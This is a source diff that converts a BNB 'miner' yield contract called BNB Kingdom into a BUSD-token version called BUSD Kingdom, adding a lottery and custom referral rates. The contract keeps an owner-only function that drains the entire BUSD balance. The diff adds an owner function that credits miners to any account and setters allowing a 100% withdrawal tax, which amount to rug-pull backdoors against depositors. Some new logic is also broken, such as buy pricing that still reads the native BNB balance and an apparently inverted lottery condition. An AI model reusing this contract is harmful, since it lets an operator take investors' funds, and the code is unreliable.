@@ -1,25 +1,21 @@
-/**
- *Submitted for verification at BscScan.com on 2022-05-27
-*/
-
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.13;
 
 
 /*
 *
-* ██████╗ ███╗   ██╗██████╗     ██╗  ██╗██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ███╗   ███╗
-* ██╔══██╗████╗  ██║██╔══██╗    ██║ ██╔╝██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║
-* ██████╔╝██╔██╗ ██║██████╔╝    █████╔╝ ██║██╔██╗ ██║██║  ███╗██║  ██║██║   ██║██╔████╔██║
-* ██╔══██╗██║╚██╗██║██╔══██╗    ██╔═██╗ ██║██║╚██╗██║██║   ██║██║  ██║██║   ██║██║╚██╔╝██║
-* ██████╔╝██║ ╚████║██████╔╝    ██║  ██╗██║██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║
-* ╚═════╝ ╚═╝  ╚═══╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
-*                                                                                     
-* BNB Kingdom - BNB Miner
+* ██████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ███╗   ███╗
+* ██╔══██╗██║   ██║██╔════╝██╔══██╗    ██║ ██╔╝██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║
+* ██████╔╝██║   ██║███████╗██║  ██║    █████╔╝ ██║██╔██╗ ██║██║  ███╗██║  ██║██║   ██║██╔████╔██║
+* ██╔══██╗██║   ██║╚════██║██║  ██║    ██╔═██╗ ██║██║╚██╗██║██║   ██║██║  ██║██║   ██║██║╚██╔╝██║
+* ██████╔╝╚██████╔╝███████║██████╔╝    ██║  ██╗██║██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║
+* ╚═════╝  ╚═════╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
 *
-* Website  : https://bnbkingdom.xyz
-* Twitter  : https://twitter.com/BNBKingdom
-* Telegram : https://t.me/BNBKingdom
+* BUSD Kingdom - BUSD Miner
+*
+* Website  : https://busdkingdom.xyz
+* Twitter  : https://twitter.com/BUSDKingdom
+* Telegram : https://t.me/BUSDKingdom
 *
 */
 
@@ -113,32 +109,69 @@ library SafeMath {
   }
 }
 
-contract BNBKingdom is Ownable {
+interface IERC20 {
+    function totalSupply() external view returns (uint);
+
+    function balanceOf(address account) external view returns (uint);
+
+    function transfer(address recipient, uint amount) external returns (bool);
+
+    function allowance(address owner, address spender) external view returns (uint);
+
+    function approve(address spender, uint amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
+}
+
+contract BUSDKingdom is Ownable {
     using SafeMath for uint256;
+    IERC20 public busd;
 
     /* base parameters */
     uint256 public EGGS_TO_HIRE_1MINERS = 864000;
-    uint256 public REFERRAL = 120;
+    uint256 public REFERRAL = 80;
+    mapping(address => uint256) referrals;
     uint256 public PERCENTS_DIVIDER = 1000;
-    uint256 private TAX = 25;
+    uint256 public TAX = 15;
     uint256 public MARKET_EGGS_DIVISOR = 5;
     uint256 public MARKET_EGGS_DIVISOR_SELL = 2;
 
-    uint256 public MIN_INVEST_LIMIT = 1 * 1e16; /* 0.01 BNB  */
-    uint256 public WALLET_DEPOSIT_LIMIT = 50 * 1e18; /* 50 BNB  */
+    // 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
+    uint256 public MIN_INVEST_LIMIT = 10 * 1e18; // 10 BUSD
+    uint256 public WALLET_DEPOSIT_LIMIT = 10_000 * 1e18; // 10,000 BUSD
 
-	uint256 public COMPOUND_BONUS = 0;
+	uint256[] public COMPOUND_BONUS;
 	uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
     uint256 public COMPOUND_STEP = 24 * 60 * 60;
 
     uint256 public WITHDRAWAL_TAX = 500;
     uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 6;
+    uint256 public LOTTERY_INTERVAL = 7 days;
+    bool public lotteryStarted = false;
+    uint256 public LOTTERY_START_TIME;
+    uint8 public lotteryRound = 1;
+    uint8 public WINNER_COUNT = 5;
+    mapping(uint8 => mapping(uint8 => address)) public WINNER_ADDRESS;
+    mapping(uint8 => mapping(uint8 => uint256)) public WINNER_AMOUNTS;
 
+    uint256 public rate = 100; // Lands per BUSD
     uint256 public totalStaked;
     uint256 public totalDeposits;
     uint256 public totalCompound;
     uint256 public totalRefBonus;
     uint256 public totalWithdrawn;
+    uint256 public totalMembers;
+
+    mapping(address => bool) isMember;
+    address[] public memberList;
+    
 
     uint256 private marketEggs;
     uint256 PSN = 10000;
@@ -148,7 +181,7 @@ contract BNBKingdom is Ownable {
     mapping(address => bool) public Blacklisted;
 
 	uint256 public CUTOFF_STEP = 48 * 60 * 60;
-	uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;
+	uint256 public WITHDRAW_COOLDOWN = 0;
 
     /* addresses */
     // address private owner;
@@ -158,6 +191,7 @@ contract BNBKingdom is Ownable {
     struct User {
         uint256 initialDeposit;
         uint256 userDeposit;
+        mapping(uint8 => uint256) LotteryDeposit;
         uint256 miners;
         uint256 claimedEggs;
         uint256 lastHatch;
@@ -172,12 +206,21 @@ contract BNBKingdom is Ownable {
 
     mapping(address => User) public users;
 
-    constructor(address payable _dev1, address payable _dev2) {
+    constructor(address payable _dev1, address payable _dev2, address _busd) {
 		require(!isContract(_dev1) && !isContract(_dev2));
         // owner = msg.sender;
         dev1 = _dev1;
         dev2 = _dev2;
+        busd = IERC20(_busd);
         marketEggs = 144000000000;
+        COMPOUND_BONUS.push(5);
+        COMPOUND_BONUS.push(5);
+        COMPOUND_BONUS.push(5);
+        COMPOUND_BONUS.push(5);
+        COMPOUND_BONUS.push(10);
+        COMPOUND_BONUS.push(10);
+        COMPOUND_BONUS.push(10);
+        COMPOUND_BONUS.push(20);
     }
 
 	function isContract(address addr) internal view returns (bool) {
@@ -208,10 +251,14 @@ contract BNBKingdom is Ownable {
         blacklisted = Blacklisted[Wallet];
     }
 
-    function CompoundRewards(bool isCompound) public {
-        User storage user = users[msg.sender];
+    function ReinvestRewards(bool isCompound) public {
         require(contractStarted, "Contract not yet Started.");
 
+        if (blacklistActive) {
+            require(!Blacklisted[msg.sender], "Address is blacklisted.");
+        }
+
+        User storage user = users[msg.sender];
         uint256 eggsUsed = getMyEggs();
         uint256 eggsForCompound = eggsUsed;
 
@@ -270,25 +317,48 @@ contract BNBKingdom is Ownable {
         }
 
         uint256 eggsPayout = eggValue.sub(payFees(eggValue));
-        payable(address(msg.sender)).transfer(eggsPayout);
+        busd.transfer(address(msg.sender), eggsPayout);
         user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
         totalWithdrawn = totalWithdrawn.add(eggsPayout);
     }
 
      
     /* transfer amount of BNB */
-    function BuyLands(address ref) public payable{
+    function LandsPurchase(address _investor, uint256 _amount, address ref) public payable{
         require(contractStarted, "Contract not yet Started.");
-        User storage user = users[msg.sender];
-        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
-        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
-        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
-        user.userDeposit = user.userDeposit.add(msg.value);
-        user.initialDeposit = user.initialDeposit.add(msg.value);
+
+        if (lotteryStarted && LOTTERY_START_TIME + LOTTERY_INTERVAL > block.timestamp) {
+            LOTTERY_START_TIME = LOTTERY_START_TIME.add(LOTTERY_INTERVAL);
+            lotteryRound = lotteryRound + 1;
+        }
+
+        if (blacklistActive) {
+            require(!Blacklisted[_investor], "Address is blacklisted.");
+        }
+
+        busd.transferFrom(address(msg.sender), address(this), _amount);
+
+        User storage user = users[_investor];
+        require(_amount >= MIN_INVEST_LIMIT, "Mininum investment not met.");
+        require(user.initialDeposit.add(_amount) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
+        uint256 eggsBought = calculateEggBuy(_amount, address(this).balance.sub(_amount));
+        user.userDeposit = user.userDeposit.add(_amount);
+        user.initialDeposit = user.initialDeposit.add(_amount);
         user.claimedEggs = user.claimedEggs.add(eggsBought);
 
+        if (lotteryStarted) {
+            user.LotteryDeposit[lotteryRound] = user.LotteryDeposit[lotteryRound].add(_amount);
+            for (uint8 i = 0; i < WINNER_COUNT; i++) {
+                if (user.LotteryDeposit[lotteryRound] > WINNER_AMOUNTS[lotteryRound][i]) {
+                    WINNER_AMOUNTS[lotteryRound][i] = user.LotteryDeposit[lotteryRound];
+                    WINNER_ADDRESS[lotteryRound][i] = _investor;
+                    break;
+                }
+            }
+        }
+
         if (user.referrer == address(0)) {
-            if (ref != msg.sender) {
+            if (ref != _investor) {
                 user.referrer = ref;
             }
 
@@ -297,28 +367,34 @@ contract BNBKingdom is Ownable {
                 users[upline1].referralsCount = users[upline1].referralsCount.add(1);
             }
         }
-                
+
         if (user.referrer != address(0)) {
             address upline = user.referrer;
             if (upline != address(0)) {
-                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
-                payable(address(upline)).transfer(refRewards);
+                uint256 refBonus = referrals[upline] != 0 ? referrals[upline] : REFERRAL;
+                uint256 refRewards = _amount.mul(refBonus).div(PERCENTS_DIVIDER);
+                busd.transfer(address(upline), refRewards);
                 users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                 totalRefBonus = totalRefBonus.add(refRewards);
             }
         }
 
-        uint256 eggsPayout = payFees(msg.value);
-        totalStaked = totalStaked.add(msg.value.sub(eggsPayout));
+        uint256 eggsPayout = payFees(_amount);
+        totalStaked = totalStaked.add(_amount.sub(eggsPayout));
         totalDeposits = totalDeposits.add(1);
-        CompoundRewards(false);
+
+        if (user.initialDeposit == 0) {
+            memberList.push(_investor);
+            totalMembers = totalMembers.add(1);
+        }
+        ReinvestRewards(false);
     }
 
-    function startKingdom(address addr) public payable{
+    function startKingdom(address addr, uint256 _amount) public payable{
         if (!contractStarted) {
     		if (msg.sender == owner()) {
     			contractStarted = true;
-                BuyLands(addr);
+                LandsPurchase(addr, _amount, msg.sender);
     		} else revert("Contract not yet started.");
     	}
     }
@@ -328,16 +404,16 @@ contract BNBKingdom is Ownable {
 
     function payFees(uint256 eggValue) internal returns(uint256){
         uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
-        dev1.transfer(tax);
-        dev2.transfer(tax);
-        return tax.mul(5);
+        busd.transfer(dev1, tax);
+        busd.transfer(dev2, tax);
+        return tax.mul(2);
     }
 
     function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
         if(users[_adr].dailyCompoundBonus == 0) {
             return 0;
         } else {
-            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
+            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS[users[_adr].dailyCompoundBonus]); 
             uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
             return result;
         }
@@ -361,7 +437,7 @@ contract BNBKingdom is Ownable {
 	}
 
     function getBalance() public view returns(uint256){
-        return address(this).balance;
+        return busd.balanceOf(address(this));
     }
 
     function getTimeStamp() public view returns (uint256) {
@@ -439,12 +515,6 @@ contract BNBKingdom is Ownable {
         return a < b ? a : b;
     }
 
-    function CHANGE_OWNERSHIP(address value) external {
-        require(msg.sender == owner(), "Admin use only.");
-        transferOwnership(value);
-    }
-
-
     function CHANGE_DEV1(address value) external {
         require(msg.sender == dev1, "Admin use only.");
         dev1 = payable(value);
@@ -458,18 +528,12 @@ contract BNBKingdom is Ownable {
     /* percentage setters */
 
     // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%
-    // 1080000 - 8%, 959000 - 9%, 864000 - 10%, 720000 - 12%
+    // 1080000 - 8%, 959000 - 9%, 864000 - 10%, 720000 - 12%, 576000 - 15%, 480000 - 18%
     
-    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
+    function SET_EGGS_TO_HIRE_1MINERS(uint256 value) external {
         require(msg.sender == owner(), "Admin use only.");
-        require(value >= 479520 && value <= 720000); /* min 3% max 12%*/
+        require(value >= 480000 && value <= 2592000); /* min 3% max 18%*/
         EGGS_TO_HIRE_1MINERS = value;
-    }
-
-    function PRC_REFERRAL(uint256 value) external {
-        require(msg.sender == owner(), "Admin use only.");
-        require(value >= 10 && value <= 100);
-        REFERRAL = value;
     }
 
     function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
@@ -486,57 +550,117 @@ contract BNBKingdom is Ownable {
 
     function SET_WITHDRAWAL_TAX(uint256 value) external {
         require(msg.sender == owner(), "Admin use only.");
-        require(value <= 900);
+        require(value <= 1000, "available between 0% and 100%");
         WITHDRAWAL_TAX = value;
     }
 
-    function BONUS_DAILY_COMPOUND(uint256 value) external {
+    function SET_COMPOUND_BONUS(uint256 value, uint8 _index) external {
         require(msg.sender == owner(), "Admin use only.");
-        require(value >= 10 && value <= 900);
-        COMPOUND_BONUS = value;
+        require(value <= 1000);
+        require(_index < 8);
+        COMPOUND_BONUS[_index] = value;
     }
 
-    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
+    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
         require(msg.sender == owner(), "Admin use only.");
-        require(value <= 30);
+        require(value <= 100);
+        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
+    }
+    
+    //--------------------------------//
+    function SET_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
+        require(msg.sender == owner(), "Admin use only.");
+        require(value <= 100, "available between 0 and 100");
         COMPOUND_BONUS_MAX_TIMES = value;
     }
-
-    function BONUS_COMPOUND_STEP(uint256 value) external {
+    
+    function SET_COMPOUND_STEP(uint256 value) external {
         require(msg.sender == owner(), "Admin use only.");
-        require(value <= 24);
-        COMPOUND_STEP = value * 60 * 60;
-    }
-
-    function SET_INVEST_MIN(uint256 value) external {
-        require(msg.sender == owner(), "Admin use only");
-        MIN_INVEST_LIMIT = value * 1e18;
+        require(value <= 1_209_600, "available between 0 and 14 days");
+        COMPOUND_STEP = value;
     }
 
     function SET_CUTOFF_STEP(uint256 value) external {
         require(msg.sender == owner(), "Admin use only");
-        CUTOFF_STEP = value * 60 * 60;
+        require(value <= 1_209_600, "available between 0 and 14 days");
+        CUTOFF_STEP = value;
     }
 
-    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
+    function SET_RATE(uint256 value) external {
         require(msg.sender == owner(), "Admin use only");
-        require(value <= 24);
-        WITHDRAW_COOLDOWN = value * 60 * 60;
+        require(value <= 1_000_000, "available between 0 and 1M");
+        rate = value;
+    }
+
+    function SET_INVEST_MIN(uint256 value) external {
+        require(msg.sender == owner(), "Admin use only");
+        require(value <= 1_000, "available between $0 and $1000");
+        MIN_INVEST_LIMIT = value * 1e18;
     }
 
     function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
         require(msg.sender == owner(), "Admin use only");
-        require(value >= 10);
-        WALLET_DEPOSIT_LIMIT = value * 1 ether;
+        require(value <= 100_000, "available between $0 and $100,000");
+        WALLET_DEPOSIT_LIMIT = value * 1e18;
     }
     
-    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
+    function SET_REFERRAL_BONUS(uint256 value) external {
         require(msg.sender == owner(), "Admin use only.");
-        require(value <= 12);
-        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
+        require(value <= 1000, "available between 0% and 100%");
+        REFERRAL = value;
+    }
+
+    function SET_CUSTOM_REFERRAL_BONUS(address _account, uint256 value) external {
+        require(msg.sender == owner(), "Admin use only.");
+        require(value <= 1000, "available between 0% and 100%");
+        referrals[_account] = value;
+    }
+
+    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
+        require(msg.sender == owner(), "Admin use only");
+        require(value <= 1_209_600, "available between 0 and 14 days");
+        WITHDRAW_COOLDOWN = value;
+    }
+
+    function SET_TAX(uint256 value) external {
+        require(msg.sender == owner(), "Admin use only");
+        require(value <= 500, "available between 0 and 50%");
+        TAX = value;
+    }
+
+    function LandsGift(address _account, uint256 _amount) external {
+        require(msg.sender == owner(), "Admin use only");
+        users[_account].miners = users[_account].miners + _amount;
     }
 
     function withDraw () onlyOwner public{
-        payable(msg.sender).transfer(address(this).balance);
+        busd.transfer(address(msg.sender), getBalance());
+    }
+
+    function SET_LOTTERY_INTERVAL(uint256 value) external {
+        require(msg.sender == owner(), "Admin use only");
+        require(value <= 1_209_600, "available between 0 and 14 days");
+        LOTTERY_INTERVAL = value;
+    }
+
+    function START_LOTTERY() external {
+        require(msg.sender == owner(), "Admin use only");
+        lotteryStarted = true;
+        LOTTERY_START_TIME = block.timestamp;
+    }
+
+    function FINISH_LOTTERY() external {
+        require(msg.sender == owner(), "Admin use only");
+        lotteryStarted = false;
+    }
+
+    function SET_WINNER_COUNT(uint8 value) external {
+        require(msg.sender == owner(), "Admin use only");
+        require(value < 10);
+        WINNER_COUNT = value;
+    }
+
+    function getLotteryWinners(uint8 _round, uint8 _index) view external returns (address, uint256) {
+        return (WINNER_ADDRESS[_round][_index], WINNER_AMOUNTS[_round][_index]);
     }
 }
